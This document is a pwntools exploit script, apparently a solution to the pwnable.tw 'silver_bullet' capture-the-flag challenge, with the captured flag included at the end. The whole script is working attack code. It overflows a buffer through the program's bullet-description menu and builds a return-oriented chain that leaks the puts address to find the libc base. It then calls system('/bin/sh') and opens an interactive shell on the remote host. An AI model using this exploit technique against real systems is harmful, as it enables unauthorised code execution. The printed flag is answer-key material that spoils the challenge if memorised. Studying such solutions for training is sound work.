from pwn import *
elf = ELF('./silver_bullet')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc_32.so.6')
# p = elf.process()
p = remote('chall.pwnable.tw', 10103)
# context.log_level = 'debug'
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

def add(con):
    p.sendlineafter("Your choice :",'1')
    p.sendlineafter("Give me your description of bullet :",str(con))

def edit(con):
    p.sendlineafter("Your choice :",'2')
    p.sendlineafter("Give me your another description of bullet :",str(con))

def beat():
    p.sendlineafter("Your choice :",'3')

def quit0():
    p.sendlineafter("Your choice :",'4')

add('a'*46)
edit('b'*2)
edit('\xff'*7 + p32(puts_plt)+p32(0x8048954)+p32(puts_got))

beat()
p.recvuntil('You win !!\n')
libc_base = u32(p.recv(4)) - libc.sym['puts']
info(hex(libc_base))
libc.address = libc_base

system = libc.sym['system']
str_sh = libc.search('/bin/sh').next()
info(hex(system))
add('a'*46)
edit('b'*2)
edit('\xff'*7 + p32(system)+p32(0x8048954)+p32(str_sh) )
beat()
p.interactive()

#FLAG{uS1ng_S1lv3r_bu1l3t_7o_Pwn_th3_w0rld}
#pwned_by_Ld1ng